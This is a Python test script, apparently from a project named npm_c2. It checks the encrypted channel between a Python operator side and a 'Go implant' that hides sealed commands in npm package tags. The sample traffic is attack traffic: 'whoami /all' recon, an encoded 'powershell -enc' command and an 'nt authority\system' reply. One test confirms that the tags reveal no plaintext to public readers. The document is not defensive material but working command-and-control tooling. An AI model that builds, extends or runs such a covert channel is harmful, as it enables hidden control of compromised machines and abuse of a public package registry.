#!/usr/bin/env python3
"""Cross-language check: Python seals, the Go implant opens, and back.

Run from the repo root with the venv python. Builds a tiny Go helper that
exposes the channel crypto so both directions are exercised for real.
"""
import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
from npm_c2.crypto import derive_key, seal, open_sealed          # noqa: E402
from npm_c2 import encode_payload, decode_tag, CMD_PREFIX       # noqa: E402

PASS = "correct horse battery staple"
PKG = "runtime-metrics-relay"

HELPER = r'''
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
)

func main() {
	var in struct {
		Op   string `json:"op"`
		Pass string `json:"pass"`
		B64  string `json:"b64"`
	}
	json.NewDecoder(os.Stdin).Decode(&in)
	key, err := deriveKey(in.Pass)
	if err != nil { fmt.Println("error"); return }
	switch in.Op {
	case "seal":
		raw, _ := base64.StdEncoding.DecodeString(in.B64)
		out, err := seal(key, raw, []byte(PKGNAME))
		if err != nil { fmt.Println("error"); return }
		fmt.Println(base64.StdEncoding.EncodeToString(out))
	case "open":
		raw, _ := base64.StdEncoding.DecodeString(in.B64)
		out, err := openSealed(key, raw, []byte(PKGNAME))
		if err != nil { fmt.Println("error"); return }
		fmt.Println(base64.StdEncoding.EncodeToString(out))
	}
}
'''
HELPER = HELPER.replace("PKGNAME", f'"{PKG}"')

root = os.path.join(os.path.dirname(__file__), "..")
tmp = tempfile.mkdtemp(prefix="chancrypto-")
helper_dir = os.path.join(tmp, "helper")
os.makedirs(helper_dir)

# The helper needs the crypto file verbatim, so copy it in.
shutil.copy(os.path.join(root, "go", "channelcrypto.go"), helper_dir)
with open(os.path.join(helper_dir, "main.go"), "w") as fh:
    fh.write(HELPER.replace("package main", "package main"))

subprocess.run(["go", "mod", "init", "helper"], cwd=helper_dir,
               check=True, capture_output=True)
# channelcrypto.go references embeddedKey, defined in buildinfo.go.
with open(os.path.join(helper_dir, "buildinfo.go"), "w") as fh:
    fh.write('package main\n\nvar embeddedKey = ""\n')
binary = os.path.join(helper_dir, "helper")
subprocess.run(["go", "build", "-o", binary, "."], cwd=helper_dir, check=True,
               capture_output=True)


def call(op, blob):
    proc = subprocess.run([binary], input=json.dumps({
        "op": op, "pass": PASS,
        "b64": base64.b64encode(blob).decode(),
    }), capture_output=True, text=True, check=True)
    out = proc.stdout.strip()
    if out == "error":
        raise RuntimeError(f"helper failed on {op}")
    return base64.b64decode(out)


fails = []

# 1. Python seals a command -> Go opens it
key = derive_key(PASS)
plain = b"whoami /all && echo multi-chunk-payload-" + b"A" * 300
sealed = seal(key, plain, PKG.encode())
got = call("open", sealed)
if got != plain:
    fails.append(f"py->go: got {got[:40]!r}")
else:
    print("[PASS] python seals -> go opens")

# 2. Go seals a reply -> Python opens it
go_sealed = call("seal", b"nt authority\\system")
try:
    back = open_sealed(key, go_sealed, PKG.encode())
    if back != b"nt authority\\system":
        fails.append(f"go->py: got {back!r}")
    else:
        print("[PASS] go seals -> python opens")
except Exception as exc:
    fails.append(f"go->py raised: {exc}")

# 3. A wrong passphrase must not decrypt
try:
    open_sealed(derive_key("wrong pass"), go_sealed, PKG.encode())
    fails.append("wrong passphrase was accepted")
except Exception:
    print("[PASS] wrong passphrase rejected")

# 4. The AAD binds to the package name
try:
    open_sealed(key, go_sealed, b"another-package")
    fails.append("AAD did not bind the package")
except Exception:
    print("[PASS] package binding enforced")

# 5. A sealed payload round-trips through the tag framing
big = b"x" * 500
tags = encode_payload(seal(key, big, PKG.encode()), CMD_PREFIX)
reassembled = b"".join(
    decode_tag(t)["data"] for t in sorted(
        tags, key=lambda t: decode_tag(t)["index"]))
if open_sealed(key, reassembled, PKG.encode()) != big:
    fails.append("sealed payload broke across chunk tags")
else:
    print(f"[PASS] sealed payload survives {len(tags)} chunk tag(s)")

# 6. A public read of the tag reveals nothing recognisable
cmd = b"powershell -enc SQBFAFgA"
tag = encode_payload(seal(key, cmd, PKG.encode()), CMD_PREFIX)[0]
carried = tag.split("_", 1)[1]
if "powershell" in base64.urlsafe_b64decode(
        carried + "=" * (-len(carried) % 4)).decode("latin-1").lower():
    fails.append("plaintext leaked into the tag")
else:
    print("[PASS] tag carries ciphertext only")

print()
if fails:
    for f in fails:
        print("FAIL:", f)
    sys.exit(1)
print("all cross-language crypto checks passed")
